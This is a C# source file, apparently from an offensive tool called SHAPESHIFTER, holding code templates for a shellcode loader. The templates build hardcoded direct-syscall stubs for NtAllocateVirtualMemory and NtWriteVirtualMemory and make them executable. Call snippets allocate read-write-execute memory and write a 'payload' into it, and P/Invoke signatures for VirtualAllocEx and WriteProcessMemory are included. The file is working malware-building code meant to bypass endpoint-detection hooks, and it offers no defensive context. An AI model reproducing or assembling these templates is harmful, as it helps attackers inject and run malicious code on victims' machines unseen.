namespace SHAPESHIFTER
{
    class Callees
    {
        #region SYSCALLS

        #region NtAllocateVirtualMemory
        public static string method_NtAllocateVirtualMemory = @"
static byte[] bNtAllocateVirtualMemory =
{
    0x4C, 0x8B, 0xD1,
    0xB8, 0x18, 0x00, 0x00, 0x00,
    0x0F, 0x05,
    0xC3
};

public static uint NtAllocateVirtualMemory(
    IntPtr ProcessHandle,
    ref IntPtr BaseAddress,
    IntPtr ZeroBits,
    ref UIntPtr RegionSize,
    uint AllocationType,
    uint Protect)
{
    byte[] syscall = bNtAllocateVirtualMemory;

    unsafe
    {
        fixed (byte* ptr = syscall)
        {
            IntPtr memoryAddress = (IntPtr)ptr;

            if (!PInvokes.VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress, (UIntPtr)syscall.Length, 0x40, out uint oldprotect))
            {
                throw new Win32Exception();
            }

            Delegates.NtAllocateVirtualMemory assembledFunction = (Delegates.NtAllocateVirtualMemory)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtAllocateVirtualMemory));

            return assembledFunction(
                ProcessHandle,
                ref BaseAddress,
                ZeroBits,
                ref RegionSize,
                AllocationType,
                Protect);
        }
    }
}
";

        public static string delegate_NtAllocateVirtualMemory = @"
[UnmanagedFunctionPointer(CallingConvention.StdCall)]
public delegate uint NtAllocateVirtualMemory(
    IntPtr ProcessHandle,
    ref IntPtr BaseAddress,
    IntPtr ZeroBits,
    ref UIntPtr RegionSize,
    ulong AllocationType,
    ulong Protect);
";

        public static string call_NtAllocateVirtualMemory = @"
IntPtr pMemoryAllocation = new IntPtr();
IntPtr pZeroBits = IntPtr.Zero;
UIntPtr pAllocationSize = new UIntPtr(Convert.ToUInt32(payload.Length));
uint allocationType = 0x3000;
uint protection = 0x40;
uint ntAllocResult = 0;

try
{
    ntAllocResult = Syscalls.NtAllocateVirtualMemory(hCurrentProcess, ref pMemoryAllocation, pZeroBits, ref pAllocationSize, allocationType, protection);
}
catch
{
    return;
}
";
        #endregion

        #region NtWriteVirtualMemory

        public static string method_NtWriteVirtualMemory = @"
static byte[] bNtWriteVirtualMemory =
{
    0x4C, 0x8B, 0xD1,               // mov r10,rcx
    0xB8, 0x3A, 0x00, 0x00, 0x00,   // mov eax,3ah
    0x0F, 0x05,                     // syscall
    0xC3                            // ret
};

public static uint NtWriteVirtualMemory(
    IntPtr ProcessHandle,
    IntPtr BaseAddress,
    byte[] Buffer,
    int BufferSize,
    int NumberOfBytesWritten)
{
    byte[] syscall = bNtWriteVirtualMemory;

    unsafe
    {
        fixed (byte* ptr = syscall)
        {
            IntPtr memoryAddress = (IntPtr)ptr;

            if (!PInvokes.VirtualProtectEx(Process.GetCurrentProcess().Handle, memoryAddress, (UIntPtr)syscall.Length, 0x40, out uint oldprotect))
            {
                throw new Win32Exception();
            }

            Delegates.NtWriteVirtualMemory assembledFunction = (Delegates.NtWriteVirtualMemory)Marshal.GetDelegateForFunctionPointer(memoryAddress, typeof(Delegates.NtWriteVirtualMemory));

            return assembledFunction(
                ProcessHandle,
                BaseAddress,
                Buffer,
                BufferSize,
                NumberOfBytesWritten);
        }
    }
}
";

        public static string delegate_NtWriteteVirtualMemory = @"
[UnmanagedFunctionPointer(CallingConvention.StdCall)]
public delegate uint NtWriteVirtualMemory(
    IntPtr ProcessHandle,
    IntPtr BaseAddress,
    byte[] Buffer,
    int BufferSize,
    int NumberOfBytesWritten);
";

        public static string call_NtWriteVirtualMemory = @"
uint ntWVMResult = 0;
try
{
    ntWVMResult = Syscalls.NtWriteVirtualMemory(hCurrentProcess, pMemoryAllocation, payload, payload.Length, 0);
}
catch
{
    return;
}
";

        #endregion

        #endregion

        #region PINVOKES
        private static readonly string dllImportAttrib = "[DllImport(\"kernel32.dll\", SetLastError = true)]\n";

        #region WriteVirtualMemory
        private static readonly string sig_WriteVirtualMemory = "public static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, uint nSize, out UIntPtr lpNumberOfBytesWritten);";
        public static string pinvoke_WriteVirtualMemory = dllImportAttrib + sig_WriteVirtualMemory;
        #endregion

        #region VirtualAllocEx
        private static readonly string sig_VirtualAllocEx = "public static extern IntPtr VirtualAllocEx(IntPtr hProcess, IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);";
        public static string pinvoke_VirtualAllocEx = dllImportAttrib + sig_VirtualAllocEx;
        #endregion

        #endregion
    }
}
